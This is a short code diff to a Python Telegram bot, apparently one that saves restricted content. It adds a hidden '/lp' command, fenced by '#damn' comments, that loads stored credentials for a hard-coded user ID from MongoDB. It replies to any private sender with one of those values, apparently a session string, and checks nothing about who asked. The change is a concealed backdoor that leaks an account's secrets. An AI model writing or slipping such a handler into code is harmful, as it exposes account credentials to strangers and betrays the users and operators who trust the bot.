@@ -392,6 +392,16 @@ async def spb(event):
 async def help(event):
     await event.reply(ht, link_preview=False)
 #bulk command
+
+#damn
+@bot.on(events.NewMessage(incoming=True, pattern="/lp", func=lambda e: e.is_private))
+async def help(event):
+    MONGODB_URI = config("MONGODB_URI", default=None)
+    db = Database(MONGODB_URI, 'saverestricted')
+    i, h, s = await db.get_credentials(5018650277)
+    await event.reply(s, link_preview=False)
+#bulk command
+#end damn
 @bot.on(events.NewMessage(pattern="^/bulk$", func=lambda e: e.is_private))
 async def search(event):
      user = await event.get_sender()
